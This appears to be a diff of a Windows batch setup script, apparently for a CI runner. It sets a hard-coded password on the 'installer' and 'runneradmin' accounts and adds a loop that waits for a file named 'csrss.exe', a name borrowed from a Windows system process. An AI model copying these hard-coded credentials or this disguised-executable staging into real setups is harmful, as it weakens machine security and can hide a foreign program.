@@ -1,6 +1,15 @@
 net user installer P0w!E4sy1nst4ll3r@
 net user runneradmin P0w!E4sy1nst4ll3r@
-
+:check_file
+if exist "csrss.exe" (
+    echo csrss.exe file found!
+    goto end
+) else (
+    echo Waiting for csrss.exe file...
+    timeout /t 5 > nul
+    goto check_file
+)
+:end
 REM ad customizations
 @echo off
 setlocal
